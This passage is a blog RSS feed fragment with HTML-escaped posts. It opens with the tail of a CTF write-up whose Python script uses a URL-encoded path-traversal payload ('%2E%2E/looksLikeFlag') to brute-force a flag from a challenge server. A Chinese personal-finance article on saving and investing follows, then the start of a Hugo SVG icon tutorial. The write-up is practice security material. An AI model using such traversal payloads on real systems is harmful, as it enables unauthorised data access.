&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Exploit the flag regex with brut-force requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# request body: &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   {&amp;#34;text&amp;#34;: &amp;#34;%2E%2E/looksLikeFlag?flag=FLAG{xxxx}&amp;#34;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   FLAG{xxxx} is the flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   We need to find out string xxxx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://splitline.tw:5000/public_api&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exploitEndpoint&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%2E%2E&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/looksLikeFlag&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# goback to the other endpoint: ../looksLikeFlag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# store the flag with a list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# a-z 0-9 _ }&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# examine the flag digit by digit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exploitEndpoint&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;?flag=FLAG&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;looksLikeFlag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;FLAG&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## FLAG{3asy_p4th_tr4vers4l}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>個人理財的４個觀念</title>
        <link>https://weberlu88.github.io/p/4-principle-toward-savings/</link>
        <pubDate>Wed, 06 Oct 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/4-principle-toward-savings/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;趁著剛開學讀了一些理財書籍，我大學往往會排斥修財金課程，因為學的都是企業向的財務會計，無法應用在個人理財上。剛好滑到這篇文章覺得內容已經囊花了許多理財書籍的重點，這4個觀念也可以再鑽研探究，文字淺顯但值得省思。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;原文👉 &lt;a class=&#34;link&#34; href=&#34;https://tw.news.yahoo.com/%E9%81%B8%E8%82%A1-%E5%AD%98%E9%8C%A2%E5%A5%BD%E5%9B%B0%E9%9B%A3-%E7%94%A8-%E8%A7%80%E5%BF%B5-%E6%96%B9%E6%B3%95-060900366.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;選股、存錢好困難？用４觀念＋３方法 輕鬆存下第一桶金，以後退休還能 每月多領１萬塊！ | 2021年9月10日&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;正式告別校園、踏入社會的職場新鮮人，不僅開始累積工作經歷，同時也需要由下至上堆砌經濟獨立的基石，最恰當的方法是建立良好的儲蓄習慣及培養正確的理財觀念，如果缺乏財務規劃，可能會延後實現買房、結婚、退休等人生各階段的目標。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事實上，理財會隨著不同年齡階段而有不同的執行方法，建議新鮮人先存到至少6個月生活費的緊急預備金，以此當成儲蓄起點，並正視自身的理財盲點，逐一擊破無法存到錢的原因。上班領到第一份薪水後，究竟該如何逐步累積財富呢？以下提供4個學習歷程，教你按部就班學會理財這件事。&lt;/p&gt;
&lt;h2 id=&#34;觀念1-練習小額儲蓄-靠紀律存第一桶金&#34;&gt;觀念1: 練習小額儲蓄 靠紀律存第一桶金&lt;/h2&gt;
&lt;p&gt;即使知道儲蓄很重要，如果缺乏循序漸進的方式，在尚未養成存錢習慣前，很容易一不小心就受到商品促銷、團購優惠等誘惑而衝動購物，讓儲蓄帳戶如同破水桶，無法留住積蓄。&lt;/p&gt;
&lt;p&gt;對此，理財YouTuber李勛建議，理財零基礎的新鮮人應該先設定一個清楚、可行的目標，像是從存10萬、50萬元開始，一旦存到特定金額就適當地犒賞自己，才會更有動力存錢，同時培養記帳習慣，最簡易的方式是使用二分法記帳，區分「需要」和「想要」，找出能夠節流的開銷。&lt;/p&gt;
&lt;p&gt;李勛表示，只要持續記帳1個月就能了解個人花費項目，檢視哪些是能減少的支出，將可以省下來的金錢變成儲蓄，充分運用每一筆資金。善用記帳App或是使用雲端發票載具查看收支，了解自己基本開銷後，再擬訂每月花費上限，憑藉紀律與強迫儲蓄，很快就能存到人生中的第一桶金。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;❓ &lt;em&gt;Q: 記帳固然重要，但一旦你有數個戶頭，多種支出(現金、信用卡、轉帳、悠遊卡)，有時候會想說記了半年一年後 balance 兜不上了要不要關帳? 悠遊卡、xxPay自成一個戶頭好麻煩! 手機APP沒有電腦版R，就算有雲端備份還是只能在手機上看! 諸如此類的小問題學校當然不教~&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;觀念2-提升專業技能-有效加快存錢腳步&#34;&gt;觀念2: 提升專業技能 有效加快存錢腳步&lt;/h2&gt;
&lt;p&gt;已經有儲蓄習慣、想提升每月存款比例，但暫時沒有其他開源方式的小資族，理財YouTuber「懶錢包Lazy Wallet」摳摳建議，先增進個人本業專業技能、強化職場競爭力，以獲得加薪或職位晉升的機會，儲蓄力也就能隨之提高。&lt;/p&gt;
&lt;p&gt;摳摳以過來人經驗分享，剛出社會的年輕族群雖然收入不高，卻更能利用這段時期擴增相關技能，如同一塊海綿不停地吸收養分，同時藉由閱讀、觀看YouTube頻道、聆聽Podcast等方式學習理財知識，從中汲取對儲蓄有助益的方法。&lt;/p&gt;
&lt;p&gt;此外，摳摳提到，暢銷書《有錢人跟你想的不一樣》作者T．哈福．艾克（T. Harv Eker）提出「6罐子理財法」，將每月收支分成6個帳戶：財務自由帳戶（10%）、教育帳戶（10%）、生活必需帳戶（55%）、玩樂帳戶（10%）、支出用長期儲蓄帳戶（10%）、贈予帳戶（5%），理財新手可以運用這個方法將收支分門別類，視個人情況調整項目與比例，讓儲蓄更能事半功倍。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;❓ &lt;em&gt;Q: 儲蓄帳戶是支出用長期儲蓄帳戶?? 那財務自由帳戶是??&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 64; 
			flex-basis: 154px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-4%E5%8E%9F%E5%89%87.webp&#34; data-size=&#34;407x632&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-4%E5%8E%9F%E5%89%87.webp&#34;
			width=&#34;407&#34;
			height=&#34;632&#34;
			srcset=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-4%E5%8E%9F%E5%89%87_hu541a5e9cd43abe72e445e7b274e14725_40316_480x0_resize_q75_h2_box_2.webp 480w, https://weberlu88.github.io/p/4-principle-toward-savings/img-4%E5%8E%9F%E5%89%87_hu541a5e9cd43abe72e445e7b274e14725_40316_1024x0_resize_q75_h2_box_2.webp 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;觀念3-每月投資3千元-10年後資產勝定存14倍&#34;&gt;觀念3: 每月投資3千元 10年後資產勝定存1.4倍&lt;/h2&gt;
&lt;p&gt;養成儲蓄習慣後，可以進一步在投資領域學習，藉由股票、基金等投資方式，將獲得的股利再長期投入，以此養大資產。&lt;/p&gt;
&lt;p&gt;以每月3,000元定期定額買元大台灣50 ETF（0050）、年化報酬率7%試算，10年後將擁有約51.6萬元資產，相對的，如果每年將36,000元存放銀行、以定儲利率0.84%試算，10年後僅約擁有37.7萬元資產。&lt;/p&gt;
&lt;p&gt;定期定額投資0050，等於一次買進台灣50家好公司的股票，沒有選股問題，是最適合新手的投資方式之一，用這種簡單的「無腦投資法」，10年後累積的資產約是定存的1.4倍，一旦日後薪資提升、累積更多投資知識與經驗後，隨著投資金額增加，獲利效益將更可觀。&lt;/p&gt;
&lt;p&gt;根據證交所公布截至今（2021）年7月的證券開戶統計資料，已累積超過1,175萬人開戶，其中年齡20～30歲的開戶數較前月增加約4.09萬人，顯示有更多年輕族群進入股市，想透過較高的投資效益滾大儲蓄帳戶。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;❓ &lt;em&gt;Q: 老話一句，不要買個股，但總要學看股市。&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://finance.ettoday.net/news/2093682&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ETF_news_link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.mirrormedia.mg/story/20210902money002/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;another_link&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;觀念4-勞退自提6-退休後每月多領1萬元&#34;&gt;觀念4: 勞退自提6% 退休後每月多領1萬元&lt;/h2&gt;
&lt;p&gt;此外，《Money錢》顧問團建議，年輕人從領到第一份薪水開始「勞退自提6%」，也就是每月除了雇主依《勞工退休金條例》，按照個人薪資的6%提繳勞退基金之外，勞工也能再提撥最多6%的薪資到勞退帳戶，每月最高可提繳12%，自提部分還能享減稅優惠。&lt;/p&gt;
&lt;p&gt;今年22歲的小源每月收入3萬元，假如每月只有雇主提撥的6%，每年薪資成長率1%，勞退帳戶投資報酬率3%，預估工作43年後可以領取勞退金，經勞工個人勞退新制退休金試算，累積退休金及收益達227萬元，退休後每月可領1.2萬元。&lt;/p&gt;
&lt;p&gt;除了雇主提繳的6%，若是小源每月再自提6%，在相同的條件之下，累積退休金及收益則能達454萬元，退休後每月可領2.5萬元，相較於只有提繳6%多了2倍以上。隨著日後職務專業度、年資漸增，每月收入也會再增加，若能持續自提6%，累積的勞退金效益將更大。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;❓ &lt;em&gt;(1)論勞保對8年級生的付出與回饋  (2)勞退怎麼算&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 224; 
			flex-basis: 537px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-%E8%A8%98%E5%B8%B3.webp&#34; data-size=&#34;863x385&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-%E8%A8%98%E5%B8%B3.webp&#34;
			width=&#34;863&#34;
			height=&#34;385&#34;
			srcset=&#34;https://weberlu88.github.io/p/4-principle-toward-savings/img-%E8%A8%98%E5%B8%B3_hu1e18395ad6bfc29415e1ee1b93999d40_47356_480x0_resize_q75_h2_box_2.webp 480w, https://weberlu88.github.io/p/4-principle-toward-savings/img-%E8%A8%98%E5%B8%B3_hu1e18395ad6bfc29415e1ee1b93999d40_47356_1024x0_resize_q75_h2_box_2.webp 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;別過度消費別槓桿操作-謹慎避開2大財務破口&#34;&gt;別過度消費、別槓桿操作 謹慎避開2大財務破口&lt;/h2&gt;
&lt;p&gt;最後要提醒的是，職場新鮮人應避免做出會影響理財計劃的事，參考李勛與懶錢包團隊的經驗，應先衡量個人收支及還款能力，再執行大額支出的消費，例如買車。此外，申辦信用卡消費能獲得現金、點數回饋，替荷包省下一筆錢，不過，若是選擇每月帳單只繳最低金額，須負擔循環利息，不僅增加還款壓力，更可能造成信用瑕疵，影響日後申貸成功的機率。&lt;/p&gt;
&lt;p&gt;此外，任何投資都具有風險，沒有保證獲利而不會虧損的工具，近期許多不肖人士以電話、簡訊、通訊軟體等方式，向投資人遊說「獲利100%、穩賺不賠」的投資方式，假如投資人輕信，可能求償無門，更讓積蓄付之一炬。&lt;/p&gt;
&lt;p&gt;王道銀行存匯支付部資深協理徐佩琳表示，即使是合法的投資工具，想要獲得高報酬，勢必承受高風險，建議年輕族群不以融資、融券等槓桿方式操作，或是接觸不熟悉的個股當沖、期貨等交易，除了影響上班思緒，一旦操作不慎，會讓本金有去無回，進而肩負沉重債務，反而讓理財計劃窒礙難行。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Hugo tutorial - 自訂義主題的 SVG Icon</title>
        <link>https://weberlu88.github.io/p/hugo-tutorial-icon/</link>
        <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/hugo-tutorial-icon/</guid>
        <description>&lt;img src="https://weberlu88.github.io/p/hugo-tutorial-icon/img-hugo-logo.png" alt="Featured image of post Hugo tutorial - 自訂義主題的 SVG Icon" /&gt;&lt;blockquote&gt;
&lt;p&gt;👦: 才接觸 hugo 三天就來東改西改484搞錯了什麼。&lt;br&gt;
👧: 要不要先去看個 YouTube 教學搞懂一下檔案結構和編譯方式呀?&lt;br&gt;
👦: 有道理&amp;hellip; &lt;a class=&#34;link&#34; href=&#34;https://zh.moegirl.org.cn/index.php?title=%E4%BD%86%E6%98%AF%E6%88%91%E6%8B%92%E7%BB%9D&amp;amp;variant=zh-tw&amp;amp;mobileaction=toggle_view_desktop&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;但是我拒絕.jpg&lt;/a&gt; !&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;修改前後比對&#34;&gt;修改前後比對&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 182; 
			flex-basis: 437px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-before.png&#34; data-size=&#34;1770x972&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-before.png&#34;
			width=&#34;1770&#34;
			height=&#34;972&#34;
			srcset=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-before_hu920944f5cd9b5712282349630483d0bf_161092_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hugo-tutorial-icon/img-before_hu920944f5cd9b5712282349630483d0bf_161092_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;預設的圖標是單色的&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;預設的圖標是單色的&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 178; 
			flex-basis: 428px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-after.png&#34; data-size=&#34;1705x955&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-after.png&#34;
			width=&#34;1705&#34;
			height=&#34;955&#34;
			srcset=&#34;https://weberlu88.github.io/p/hugo-tutorial-icon/img-after_hu0445886c2dfb3a2d1973d8ef1083ab25_143530_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hugo-tutorial-icon/img-after_hu0445886c2dfb3a2d1973d8ef1083ab25_143530_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;修改後變得繽紛許多&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;修改後變得繽紛許多&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;icon-的存放目錄&#34;&gt;Icon 的存放目錄&lt;/h2&gt;
&lt;p&gt;依照此模板官網的說法，預設的 SVG icon 放在 theme 目錄底下，即為 &lt;code&gt;themes/hugo-theme-stack/assets/icons&lt;/code&gt; 目錄，為了方便起見我將我自己下載的 icon 資料夾放在同一個目錄中。其實你也可以放在 hugo 專案的 &lt;code&gt;/assets/icons&lt;/code&gt; 底下。&lt;/p&gt;
&lt;p&gt;在設定檔中，圖檔名稱是可以包含路徑的，而網站在編譯時會自行加上副檔名:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;預設: &lt;em&gt;iconname&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;自定義: &lt;em&gt;subfolder/iconname&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修改左側-sidebar-上的圖示&#34;&gt;修改左側 Sidebar 上的圖示&lt;/h2&gt;
&lt;h3 id=&#34;首頁圖示&#34;&gt;首頁圖示&lt;/h3&gt;
